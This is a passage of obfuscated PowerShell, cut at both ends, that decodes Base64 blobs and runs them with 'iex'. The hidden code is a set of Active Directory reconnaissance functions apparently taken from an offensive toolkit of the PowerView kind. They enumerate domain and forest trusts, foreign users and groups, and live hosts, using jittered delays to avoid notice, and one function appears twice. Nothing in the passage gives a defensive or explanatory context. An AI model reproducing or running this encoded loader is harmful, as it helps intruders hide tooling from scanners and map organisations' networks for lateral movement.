ERvbWFpblNJRAogICAgICAgICAgICAgICAgJ1RydXN0R3JvdXBzU0lEcycgPSAkVHJ1c3RHcm91cHNTSURzCiAgICAgICAgICAgIH0KICAgICAgICAgICAgSW52b2tlLVRocmVhZGVkRnVuY3Rpb24gLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtU2NyaXB0UGFyYW1ldGVycyAkU2NyaXB0UGFyYW1zCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBpZigtbm90ICROb1BpbmcgLWFuZCAoJENvbXB1dGVyTmFtZS5jb3VudCAtbmUgMSkpIHsKICAgICAgICAgICAgICAgICRQaW5nID0ge3BhcmFtKCRDb21wdXRlck5hbWUpIGlmKFRlc3QtQ29ubmVjdGlvbiAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUgLUNvdW50IDEgLVF1aWV0IC1FcnJvckFjdGlvbiBTdG9wKXskQ29tcHV0ZXJOYW1lfX0KICAgICAgICAgICAgICAgICRDb21wdXRlck5hbWUgPSBJbnZva2UtVGhyZWFkZWRGdW5jdGlvbiAtTm9JbXBvcnRzIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZSAtU2NyaXB0QmxvY2sgJFBpbmcgLVRocmVhZHMgMTAwCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIG51bWJlciBvZiBhY3RpdmUgaG9zdHM6ICQoJENvbXB1dGVyTmFtZS5jb3VudCkiCiAgICAgICAgICAgICRDb3VudGVyID0gMAogICAgICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAgICAgJENvdW50ZXIgPSAkQ291bnRlciArIDEKICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRSYW5kTm8uTmV4dCgoMS0kSml0dGVyKSokRGVsYXksICgxKyRKaXR0ZXIpKiREZWxheSkKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBFbnVtZXJhdGluZyBzZXJ2ZXIgJENvbXB1dGVyICgkQ291bnRlciBvZiAkKCRDb21wdXRlck5hbWUuY291bnQpKSIKICAgICAgICAgICAgICAgIEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtQXJndW1lbnRMaXN0ICRDb21wdXRlciwgJEZhbHNlLCAkT3V0RmlsZSwgJERvbWFpblNJRCwgJFRydXN0R3JvdXBzU0lEcwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldERvbWFpblRydXN0IHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiA9IChHZXQtTmV0RG9tYWluKS5OYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkTERBUCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMDAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICkKICAgIHByb2Nlc3MgewogICAgICAgIGlmKCRMREFQIC1vciAkRG9tYWluQ29udHJvbGxlcikgewogICAgICAgICAgICAkVHJ1c3RTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLVBhZ2VTaXplICRQYWdlU2l6ZQogICAgICAgICAgICBpZigkVHJ1c3RTZWFyY2hlcikgewogICAgICAgICAgICAgICAgJFRydXN0U2VhcmNoZXIuZmlsdGVyID0gJygmKG9iamVjdENsYXNzPXRydXN0ZWREb21haW4pKScKICAgICAgICAgICAgICAgICRUcnVzdFNlYXJjaGVyLkZpbmRBbGwoKSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRQcm9wcyA9ICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJFRydXN0QXR0cmliID0gU3dpdGNoICgkUHJvcHMudHJ1c3RhdHRyaWJ1dGVzKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgMHgwMDEgeyAibm9uX3RyYW5zaXRpdmUiIH0KICAgICAgICAgICAgICAgICAgICAgICAgMHgwMDIgeyAidXBsZXZlbF9vbmx5IiB9CiAgICAgICAgICAgICAgICAgICAgICAgIDB4MDA0IHsgInF1YXJhbnRpbmVkX2RvbWFpbiIgfQogICAgICAgICAgICAgICAgICAgICAgICAweDAwOCB7ICJmb3Jlc3RfdHJhbnNpdGl2ZSIgfQogICAgICAgICAgICAgICAgICAgICAgICAweDAxMCB7ICJjcm9zc19vcmdhbml6YXRpb24iIH0KICAgICAgICAgICAgICAgICAgICAgICAgMHgwMjAgeyAid2l0aGluX2ZvcmVzdCIgfQogICAgICAgICAgICAgICAgICAgICAgICAweDA0MCB7ICJ0cmVhdF9hc19leHRlcm5hbCIgfQogICAgICAgICAgICAgICAgICAgICAgICAweDA4MCB7ICJ0cnVzdF91c2VzX3JjNF9lbmNyeXB0aW9uIiB9CiAgICAgICAgICAgICAgICAgICAgICAgIDB4MTAwIHsgInRydXN0X3VzZXNfYWVzX2tleXMiIH0KICAgICAgICAgICAgICAgICAgICAgICAgRGVmYXVsdCB7IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiVW5rbm93biB0cnVzdCBhdHRyaWJ1dGU6ICQoJFByb3BzLnRydXN0YXR0cmlidXRlcykiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgIiQoJFByb3BzLnRydXN0YXR0cmlidXRlcykiOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICREaXJlY3Rpb24gPSBTd2l0Y2ggKCRQcm9wcy50cnVzdGRpcmVjdGlvbikgewogICAgICAgICAgICAgICAgICAgICAgICAwIHsgIkRpc2FibGVkIiB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEgeyAiSW5ib3VuZCIgfQogICAgICAgICAgICAgICAgICAgICAgICAyIHsgIk91dGJvdW5kIiB9CiAgICAgICAgICAgICAgICAgICAgICAgIDMgeyAiQmlkaXJlY3Rpb25hbCIgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkT2JqZWN0R3VpZCA9IE5ldy1PYmplY3QgR3VpZCBAKCwkUHJvcHMub2JqZWN0Z3VpZFswXSkKICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU291cmNlTmFtZScgJERvbWFpbgogICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUYXJnZXROYW1lJyAkUHJvcHMubmFtZVswXQogICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3RHdWlkJyAieyRPYmplY3RHdWlkfSIKICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVHJ1c3RUeXBlJyAiJFRydXN0QXR0cmliIgogICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUcnVzdERpcmVjdGlvbicgIiREaXJlY3Rpb24iCiAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRGb3VuZERvbWFpbiA9IEdldC1OZXREb21haW4gLURvbWFpbiAkRG9tYWluCiAgICAgICAgICAgIGlmKCRGb3VuZERvbWFpbikgewogICAgICAgICAgICAgICAgKEdldC1OZXREb21haW4gLURvbWFpbiAkRG9tYWluKS5HZXRBbGxUcnVzdFJlbGF0aW9uc2hpcHMoKQogICAgICAgICAgICB9ICAgICAKICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldEZvcmVzdFRydXN0IHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEZvcmVzdAogICAgKQogICAgcHJvY2VzcyB7CiAgICAgICAgJEZvdW5kRm9yZXN0ID0gR2V0LU5ldEZvcmVzdCAtRm9yZXN0ICRGb3Jlc3QKICAgICAgICBpZigkRm91bmRGb3Jlc3QpIHsKICAgICAgICAgICAgJEZvdW5kRm9yZXN0LkdldEFsbFRydXN0UmVsYXRpb25zaGlwcygpCiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1Gb3JlaWduVXNlciB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlck5hbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkTERBUCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZWN1cnNlLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRQYWdlU2l6ZSA9IDIwMAogICAgKQogICAgZnVuY3Rpb24gR2V0LUZvcmVpZ25Vc2VyIHsKICAgICAgICBwYXJhbSgKICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJFVzZXJOYW1lLAogICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAkRG9tYWluLAogICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwMCldIAogICAgICAgICAgICBbSW50XQogICAgICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICAgICApCiAgICAgICAgaWYgKCREb21haW4pIHsKICAgICAgICAgICAgJERpc3Rpbmd1aXNoZWREb21haW5OYW1lID0gIkRDPSIgKyAkRG9tYWluIC1yZXBsYWNlICdcLicsJyxEQz0nCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkRGlzdGluZ3Vpc2hlZERvbWFpbk5hbWUgPSBbU3RyaW5nXSAoW2Fkc2ldJycpLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICREb21haW4gPSAkRGlzdGluZ3Vpc2hlZERvbWFpbk5hbWUgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgIH0KICAgICAgICBHZXQtTmV0VXNlciAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLVVzZXJOYW1lICRVc2VyTmFtZSAtUGFnZVNpemUgJFBhZ2VTaXplIHwgV2hlcmUtT2JqZWN0IHskXy5tZW1iZXJvZn0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIEZvckVhY2ggKCRNZW1iZXJzaGlwIGluICRfLm1lbWJlcm9mKSB7CiAgICAgICAgICAgICAgICAkSW5kZXggPSAkTWVtYmVyc2hpcC5JbmRleE9mKCJEQz0iKQogICAgICAgICAgICAgICAgaWYoJEluZGV4KSB7CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwRG9tYWluID0gJCgkTWVtYmVyc2hpcC5zdWJzdHJpbmcoJEluZGV4KSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgIGlmICgkR3JvdXBEb21haW4uQ29tcGFyZVRvKCREb21haW4pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE5hbWUgPSAkTWVtYmVyc2hpcC5zcGxpdCgiLCIpWzBdLnNwbGl0KCI9IilbMV0KICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlckRvbWFpbicgJERvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlck5hbWUnICRfLnNhbWFjY291bnRuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cERvbWFpbicgJEdyb3VwRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE5hbWUnICRHcm91cE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwRE4nICRNZW1iZXJzaGlwCiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduVXNlcgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIGlmICgkUmVjdXJzZSkgewogICAgICAgIGlmKCRMREFQIC1vciAkRG9tYWluQ29udHJvbGxlcikgewogICAgICAgICAgICAkRG9tYWluVHJ1c3RzID0gSW52b2tlLU1hcERvbWFpblRydXN0IC1MREFQIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1QYWdlU2l6ZSAkUGFnZVNpemUgfCBGb3JFYWNoLU9iamVjdCB7ICRfLlNvdXJjZURvbWFpbiB9IHwgU29ydC1PYmplY3QgLVVuaXF1ZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJERvbWFpblRydXN0cyA9IEludm9rZS1NYXBEb21haW5UcnVzdCAtUGFnZVNpemUgJFBhZ2VTaXplIHwgRm9yRWFjaC1PYmplY3QgeyAkXy5Tb3VyY2VEb21haW4gfSB8IFNvcnQtT2JqZWN0IC1VbmlxdWUKICAgICAgICB9CiAgICAgICAgRm9yRWFjaCgkRG9tYWluVHJ1c3QgaW4gJERvbWFpblRydXN0cykgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFbnVtZXJhdGluZyB0cnVzdCBncm91cHMgaW4gZG9tYWluICREb21haW5UcnVzdCIKICAgICAgICAgICAgR2V0LUZvcmVpZ25Vc2VyIC1Eb21haW4gJERvbWFpblRydXN0IC1Vc2VyTmFtZSAkVXNlck5hbWUgLVBhZ2VTaXplICRQYWdlU2l6ZQogICAgICAgIH0KICAgIH0KICAgIGVsc2UgewogICAgICAgIEdldC1Gb3JlaWduVXNlciAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLVVzZXJOYW1lICRVc2VyTmFtZSAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1Gb3JlaWduR3JvdXAgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEdyb3VwTmFtZSA9ICcqJywKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRMREFQLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJlY3Vyc2UsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwMCldIAogICAgICAgIFtJbnRdCiAgICAgICAgJFBhZ2VTaXplID0gMjAwCiAgICApCiAgICBmdW5jdGlvbiBHZXQtRm9yZWlnbkdyb3VwIHsKICAgICAgICBwYXJhbSgKICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJEdyb3VwTmFtZSA9ICcqJywKICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJERvbWFpbiwKICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMDApXSAKICAgICAgICAgICAgW0ludF0KICAgICAgICAgICAgJFBhZ2VTaXplID0gMjAwCiAgICAgICAgKQogICAgICAgIGlmKC1ub3QgJERvbWFpbikgewogICAgICAgICAgICAkRG9tYWluID0gKEdldC1OZXREb21haW4pLk5hbWUKICAgICAgICB9CiAgICAgICAgJERvbWFpbkROID0gIkRDPSQoJERvbWFpbi5SZXBsYWNlKCcuJywgJyxEQz0nKSkiCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiRG9tYWluRE46ICREb21haW5ETiIKICAgICAgICAkRXhjbHVkZUdyb3VwcyA9IEAoIlVzZXJzIiwgIkRvbWFpbiBVc2VycyIsICJHdWVzdHMiKQogICAgICAgIEdldC1OZXRHcm91cCAtR3JvdXBOYW1lICRHcm91cE5hbWUgLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1GdWxsRGF0YSAtUGFnZVNpemUgJFBhZ2VTaXplIHwgV2hlcmUtT2JqZWN0IHskXy5tZW1iZXJ9IHwgV2hlcmUtT2JqZWN0IHsKICAgICAgICAgICAgLW5vdCAoJEV4Y2x1ZGVHcm91cHMgLWNvbnRhaW5zICRfLnNhbWFjY291bnRuYW1lKSB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJEdyb3VwTmFtZSA9ICRfLnNhbUFjY291bnROYW1lCiAgICAgICAgICAgICAgICAkXy5tZW1iZXIgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCgkXyAtbWF0Y2ggJ0NOPVMtMS01LTIxLiotLionKSAtb3IgKCREb21haW5ETiAtbmUgKCRfLnN1YnN0cmluZygkXy5JbmRleE9mKCJEQz0iKSkpKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICRfLnN1YlN0cmluZygkXy5JbmRleE9mKCJEQz0iKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkXy5zcGxpdCgiLCIpWzBdLnNwbGl0KCI9IilbMV0KICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cFVzZXIgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBVc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwRG9tYWluJyAkRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBVc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwTmFtZScgJEdyb3VwTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnbkdyb3VwVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyRG9tYWluJyAkVXNlckRvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnbkdyb3VwVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJFVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBVc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJETicgJF8KICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cFVzZXIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgaWYgKCRSZWN1cnNlKSB7CiAgICAgICAgaWYoJExEQVAgLW9yICREb21haW5Db250cm9sbGVyKSB7CiAgICAgICAgICAgICREb21haW5UcnVzdHMgPSBJbnZva2UtTWFwRG9tYWluVHJ1c3QgLUxEQVAgLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLVBhZ2VTaXplICRQYWdlU2l6ZSB8IEZvckVhY2gtT2JqZWN0IHsgJF8uU291cmNlRG9tYWluIH0gfCBTb3J0LU9iamVjdCAtVW5pcXVlCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkRG9tYWluVHJ1c3RzID0gSW52b2tlLU1hcERvbWFpblRydXN0IC1QYWdlU2l6ZSAkUGFnZVNpemUgfCBGb3JFYWNoLU9iamVjdCB7ICRfLlNvdXJjZURvbWFpbiB9IHwgU29ydC1PYmplY3QgLVVuaXF1ZQogICAgICAgIH0KICAgICAgICBGb3JFYWNoKCREb21haW5UcnVzdCBpbiAkRG9tYWluVHJ1c3RzKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkVudW1lcmF0aW5nIHRydXN0IGdyb3VwcyBpbiBkb21haW4gJERvbWFpblRydXN0IgogICAgICAgICAgICBHZXQtRm9yZWlnbkdyb3VwIC1Hcm91cE5hbWUgJEdyb3VwTmFtZSAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLVBhZ2VTaXplICRQYWdlU2l6ZQogICAgICAgIH0KICAgIH0KICAgIGVsc2UgewogICAgICAgIEdldC1Gb3JlaWduR3JvdXAgLUdyb3VwTmFtZSAkR3JvdXBOYW1lIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLU1hcERvbWFpblRydXN0IHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbU3dpdGNoXQogICAgICAgICRMREFQLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwMCldIAogICAgICAgIFtJbnRdCiAgICAgICAgJFBhZ2VTaXplID0gMjAwCiAgICApCiAgICAkU2VlbkRvbWFpbnMgPSBAe30KICAgICREb21haW5zID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3RhY2sKICAgICRDdXJyZW50RG9tYWluID0gKEdldC1OZXREb21haW4pLk5hbWUKICAgICREb21haW5zLnB1c2goJEN1cnJlbnREb21haW4pCiAgICB3aGlsZSgkRG9tYWlucy5Db3VudCAtbmUgMCkgewogICAgICAgICREb21haW4gPSAkRG9tYWlucy5Qb3AoKQogICAgICAgIGlmICgtbm90ICRTZWVuRG9tYWlucy5Db250YWluc0tleSgkRG9tYWluKSkgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFbnVtZXJhdGluZyB0cnVzdHMgZm9yIGRvbWFpbiAnJERvbWFpbiciCiAgICAgICAgICAgICROdWxsID0gJFNlZW5Eb21haW5zLmFkZCgkRG9tYWluLCAiIikKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmKCRMREFQIC1vciAkRG9tYWluQ29udHJvbGxlcikgewogICAgICAgICAgICAgICAgICAgICRUcnVzdHMgPSBHZXQtTmV0RG9tYWluVHJ1c3QgLURvbWFpbiAkRG9tYWluIC1MREFQIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRUcnVzdHMgPSBHZXQtTmV0RG9tYWluVHJ1c3QgLURvbWFpbiAkRG9tYWluIC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmKCRUcnVzdHMgLWlzbm90IFtzeXN0ZW0uYXJyYXldKSB7CiAgICAgICAgICAgICAgICAgICAgJFRydXN0cyA9IEAoJFRydXN0cykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRUcnVzdHMgKz0gR2V0LU5ldEZvcmVzdFRydXN0IC1Gb3Jlc3QgJERvbWFpbgogICAgICAgICAgICAgICAgaWYgKCRUcnVzdHMpIHsKICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkVHJ1c3QgaW4gJFRydXN0cykgewogICAgICAgICAgICAgICAgICAgICAgICAkU291cmNlRG9tYWluID0gJFRydXN0LlNvdXJjZU5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICRUcnVzdC5UYXJnZXROYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRUcnVzdFR5cGUgPSAkVHJ1c3QuVHJ1c3RUeXBlCiAgICAgICAgICAgICAgICAgICAgICAgICRUcnVzdERpcmVjdGlvbiA9ICRUcnVzdC5UcnVzdERpcmVjdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICREb21haW5zLnB1c2goJFRhcmdldERvbWFpbikKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU291cmNlRG9tYWluJyAiJFNvdXJjZURvbWFpbiIKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldERvbWFpbicgIiRUYXJnZXREb21haW4iCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUcnVzdFR5cGUnICIkVHJ1c3RUeXBlIgogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVHJ1c3REaXJlY3Rpb24nICIkVHJ1c3REaXJlY3Rpb24iCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbIV0gRXJyb3I6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLU1hcERvbWFpblRydXN0IHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbU3dpdGNoXQogICAgICAgICRMREFQLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwMCldIAogICAgICAgIFtJbnRdCiAgICAgICAgJFBhZ2VTaXplID0gMjAwCiAgICApCiAgICAkU2VlbkRvbWFpbnMgPSBAe30KICAgICREb21haW5zID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3RhY2sKICAgICRDdXJyZW50RG9tYWluID0gKEdldC1OZXREb21haW4pLk5hbWUKICAgICREb21haW5zLnB1c2goJEN1cnJlbnREb21haW4pCiAgICB3aGlsZSgkRG9tYWlucy5Db3VudCAtbmUgMCkgewogICAgICAgICREb21haW4gPSAkRG9tYWlucy5Qb3AoKQogICAgICAgIGlmICgtbm90ICRTZWVuRG9tYWlucy5Db250YWluc0tleSgkRG9tYWluKSkgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFbnVtZXJhdGluZyB0cnVzdHMgZm9yIGRvbWFpbiAnJERvbWFpbiciCiAgICAgICAgICAgICROdWxsID0gJFNlZW5Eb21haW5zLmFkZCgkRG9tYWluLCAiIikKICAgICAgICAgICAgdH